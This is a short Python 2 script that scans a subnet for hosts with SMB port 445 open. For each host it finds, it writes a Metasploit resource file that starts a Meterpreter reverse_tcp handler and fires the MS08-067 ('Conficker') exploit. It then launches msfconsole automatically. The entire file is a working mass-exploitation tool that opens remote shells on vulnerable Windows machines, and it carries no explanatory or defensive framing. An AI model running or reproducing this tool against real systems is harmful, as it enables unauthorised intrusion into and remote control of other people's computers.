import nmap
import optparse
import sys
import os


def findTgts(subNet):
	nm=nmap.PortScanner()
	nm.scan(subNet,'445')
	tgtHosts=[]
	for host in nm.all_hosts():
		if nm[host].has_tcp(445):
			state=nm[host]['tcp'][445]['state']
			if state=='open':
				print '[+] Find Target Host : ' + host
				tgtHosts.append(host)


	return tgtHosts

def confickerExploit(configFile,tgtHost,lhost,lport):
	configFile.write('use exploit/windows/smb/ms08_067_netapi\n')
	configFile.write('set RHOST ' +str(tgtHost) +'\n')
	configFile.write('set LHOST ' +str(lhost) + '\n')
	configFile.write('set LPORT ' +str(lport)+'\n')
	configFile.write('set payload windows/meterpreter/reverse_tcp\n')
	configFile.write('exploit\n')

def handler(configFile,lhost,lport):
	configFile.write('use exploit/multi/handler\n')
	configFile.write('set payload windows/meterpreter/reverse_tcp\n')
	configFile.write('set LPORT '+str(lport) + '\n')
	configFile.write('set LHOST '+str(lhost) + '\n')
	configFile.write('exploit -j -z\n')
	configFile.write('setg DisablePayloadHandler 1\n')

def main():
	parser=optparse.OptionParser('-H <target Host> -l <Lport> -L <Lhost>')
	configFile=open('meta.rc','w')
	parser.add_option('-H',dest='tgtHost',type='string') 

	parser.add_option('-l',dest='lport',type='string') 

	parser.add_option('-L',dest='lhost',type='string') 
	(options, args)=parser.parse_args()
	if (options.tgtHost==None) | (options.lhost==None) :
		print parser.usage
		exit(0)
	
	lhost=options.lhost
	lport=options.lport
	if lport==None:
		lport='1337'
	tgtHosts=findTgts(options.tgtHost)
	handler(configFile,lhost,lport)
	for tgtHost in tgtHosts:
		confickerExploit(configFile,tgtHost,lhost,lport)

	configFile.close()
	os.system('msfconsole -r meta.rc')

main()

